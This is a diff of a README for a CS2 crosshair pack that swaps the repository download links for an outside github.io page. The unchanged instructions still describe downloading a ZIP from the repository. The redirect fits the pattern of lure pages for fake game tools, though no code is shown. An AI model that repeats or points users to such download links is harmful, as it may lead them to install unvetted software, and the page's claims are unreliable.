@@ -1,6 +1,6 @@
 # 🎯 cs2-crosshair-pack-2026 - 1000+ Pro Crosshairs, One Click Away
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Crosshair_Pack_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/Antony14816/cs2-crosshair-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Crosshair_Pack_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://antony14816.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and use the CS2 Crosshair Pack 2026. 
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Antony14816/cs2-crosshair-pack-2026](https://github.com/Antony14816/cs2-crosshair-pack-2026)
+Visit this link to download the application: [https://antony14816.github.io](https://antony14816.github.io)
 
 Once you click the link, you'll see a green "Code" button on the page. Click it, then select "Download ZIP". The file will start downloading to your computer.
 
